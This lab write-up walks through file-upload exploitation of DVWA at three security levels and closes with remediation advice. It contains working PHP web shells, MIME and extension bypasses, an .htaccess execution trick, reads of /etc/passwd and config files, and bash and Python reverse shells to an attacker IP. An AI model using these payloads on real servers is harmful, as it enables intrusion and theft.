# Lab Write-Up: File Upload Vulnerability
**Date:** 2026-08-28  
**Author:** Adinath Dubile  
**Lab Environment:** DVWA (Damn Vulnerable Web Application)  
**Difficulty Levels Tested:** Low | Medium | High  
**Category:** Insecure File Upload  
**OWASP Top 10:** A04:2021 – Insecure Design  

---

## 1. Introduction

Insecure File Upload vulnerabilities occur when a web application allows users to upload files without properly validating the file type, contents, or destination. This can allow attackers to upload malicious files — such as PHP web shells — that can then be executed on the server to achieve Remote Code Execution (RCE).

**Goal of this lab:** Upload a PHP web shell to the DVWA server and execute arbitrary commands to demonstrate full RCE.

---

## 2. Environment Setup

| Component        | Details                              |
|------------------|--------------------------------------|
| **Target App**   | DVWA – File Upload Module            |
| **Attacker OS**  | Kali Linux                           |
| **Tools Used**   | Browser, Burp Suite, Netcat          |
| **Network**      | Local lab (NAT/Host-Only)            |
| **Shell Used**   | PHP web shell / reverse shell        |

---

## 3. Vulnerability Overview

### What is File Upload Vulnerability?

An insecure file upload vulnerability arises when applications fail to:
- Validate the file extension (e.g., `.php`, `.php5`, `.phtml`)
- Verify the MIME type server-side
- Scan file content for malicious code
- Store uploaded files outside the web root

**Attack Goal:**
```
Upload PHP shell → Navigate to uploaded file URL → Execute commands → RCE
```

**PHP Web Shell (Used in this lab):**
```php
<?php echo shell_exec($_GET['cmd']); ?>
```

Or a more feature-rich shell:
```php
<?php system($_REQUEST['cmd']); ?>
```

---

## 4. Exploitation

### 4.1 Low Security Level

**Setup:** Navigate to DVWA → File Upload. Set security to **Low**.

#### Step 1 – Create the PHP Web Shell

On Kali, create a file named `shell.php`:
```bash
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell.php
```

#### Step 2 – Upload the Shell

1. Click "Browse" and select `shell.php`
2. Click "Upload"

**Server Response:**
```
../../hackable/uploads/shell.php succesfully uploaded!
```

#### Step 3 – Access the Shell

Navigate to:
```
http://localhost/dvwa/hackable/uploads/shell.php?cmd=whoami
```

**Output:**
```
www-data
```

✅ Remote Code Execution confirmed!

#### Step 4 – System Enumeration

```
?cmd=id
?cmd=uname -a
?cmd=cat /etc/passwd
?cmd=ls /var/www/html/dvwa/config
?cmd=cat /var/www/html/dvwa/config/config.inc.php
```

#### Step 5 – Upgrade to Reverse Shell

**Kali listener:**
```bash
nc -lvnp 4444
```

**URL payload:**
```
?cmd=bash -i >& /dev/tcp/192.168.x.x/4444 0>&1
```

URL-encoded:
```
?cmd=bash+-i+>%26+/dev/tcp/192.168.x.x/4444+0>%261
```

---

### 4.2 Medium Security Level

**Setup:** Set security to **Medium**.

**Observation:** The application now checks for allowed file types. Only `image/jpeg` and `image/png` MIME types are accepted.

#### Step 1 – Test Direct Upload (Blocked)

Upload `shell.php` → **Error:** "Your image was not uploaded. We can only accept JPEG or PNG images."

#### Step 2 – Bypass via Burp Suite (MIME Type Spoofing)

The server checks the `Content-Type` header sent with the file, which can be manipulated:

1. Rename file: `mv shell.php shell.php.jpg` (or just `shell.jpg`)
2. Upload it via browser
3. **Intercept in Burp Suite**

**Original intercepted request (partial):**
```
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: application/x-php
```

**Modify in Burp:**
```
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: image/jpeg
```

4. Forward the modified request

**Server Response:**
```
../../hackable/uploads/shell.php succesfully uploaded!
```

#### Step 3 – Access Shell

```
http://localhost/dvwa/hackable/uploads/shell.php?cmd=id
```

**Output:** `uid=33(www-data) gid=33(www-data)`

#### Alternative: Double Extension Bypass

Rename the file `shell.php.jpg`:
- Server may strip the last extension or accept `Content-Type: image/jpeg`
- Change `Content-Type` to `image/jpeg` in Burp

---

### 4.3 High Security Level

**Setup:** Set security to **High**.

**Observation:** The server now inspects the **actual file content** (magic bytes) to verify it's a real image. Additionally, the filename is sanitized.

#### Step 1 – Bypass via Image + PHP Polyglot

Create a file that is **both a valid JPEG and contains PHP code**:

```bash
# Copy a real JPEG and append PHP code
cp /path/to/real_image.jpg shell.jpg.php
echo '<?php echo shell_exec($_GET["cmd"]); ?>' >> shell.jpg.php
```

Or inject PHP into EXIF metadata of a real image:
```bash
exiftool -Comment='<?php echo shell_exec($_GET["cmd"]); ?>' real_image.jpg
mv real_image.jpg shell.php.jpg
```

#### Step 2 – Upload with Burp MIME Bypass

1. Upload `shell.php.jpg` with `Content-Type: image/jpeg`
2. **Intercept in Burp** and change filename to `shell.php`
3. Forward request

**Alternative – .htaccess Attack:**

Upload a custom `.htaccess` file first:
```
AddType application/x-httpd-php .jpg
```

Then upload `shell.jpg` (actual PHP code with `.jpg` extension):
```php
<?php echo shell_exec($_GET["cmd"]); ?>
```

The `.htaccess` rule makes the server execute `.jpg` files as PHP.

#### Step 3 – Access and Execute

Navigate to:
```
http://localhost/dvwa/hackable/uploads/shell.php?cmd=id
```

---

## 5. Post-Exploitation (Upgrade to Interactive Shell)

After getting basic RCE via the web shell, upgrade to an interactive reverse shell:

**Kali listener:**
```bash
nc -lvnp 4444
```

**Web shell payload:**
```
?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.x.x",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

---

## 6. Findings Summary

| Security Level | Vulnerable | Bypass Method              | Outcome     |
|----------------|------------|----------------------------|-------------|
| Low            | ✅ Yes     | Direct .php upload          | Full RCE    |
| Medium         | ✅ Yes     | Burp MIME type spoofing     | Full RCE    |
| High           | ✅ Yes     | Polyglot / .htaccess trick  | Full RCE    |

---

## 7. Impact Assessment

| Category       | Rating   |
|----------------|----------|
| **Severity**   | Critical |
| **CVSS Score** | 10.0     |
| **CIA Impact** | Confidentiality: High, Integrity: High, Availability: High |

**Business Impact:**
- Complete server compromise
- Access to all files on the server including credentials
- Ability to pivot into internal network
- Persistent backdoor installation
- Data exfiltration

---

## 8. Remediation Recommendations

| Fix                               | Description                                                     |
|-----------------------------------|-----------------------------------------------------------------|
| **Whitelist File Extensions**     | Only allow `.jpg`, `.png`, `.gif` — block `.php`, `.phtml`     |
| **Server-Side MIME Validation**   | Verify file content, not just the `Content-Type` header        |
| **Store Outside Web Root**        | Save uploads to `/uploads/` outside `/var/www/html/`           |
| **Rename Uploaded Files**         | Generate random filename to prevent direct access              |
| **Disable PHP Execution in Uploads** | Add `.htaccess`: `php_flag engine off`                      |
| **Scan File Content**             | Use antivirus scanning or ClamAV on uploads                    |
| **Limit File Size**               | Prevent large uploads that could cause DoS                     |

**Secure Upload Directory Config (Apache):**
```apache
<Directory /var/www/html/dvwa/hackable/uploads>
    php_flag engine off
    Options -ExecCGI
    AddType text/plain .php .php5 .phtml
</Directory>
```

---

## 9. References

- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [PortSwigger – File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [Hacking Articles – DVWA File Upload](https://www.hackingarticles.in/hack-file-upload-vulnerability-dvwa-bypass-security/)
- [PayloadAllTheThings – File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)

---

## 10. Proof of Concept (PoC) Summary

```
Target:    DVWA – File Upload Module
File:      shell.php (PHP web shell)
Access:    http://localhost/dvwa/hackable/uploads/shell.php?cmd=id
Result:    www-data command execution confirmed
Upgrade:   Reverse shell established to Kali (nc -lvnp 4444)
Severity:  CRITICAL (CVSS 10.0)
```

---

*Write-up created for portfolio/educational purposes only. All testing performed in an isolated lab environment.*
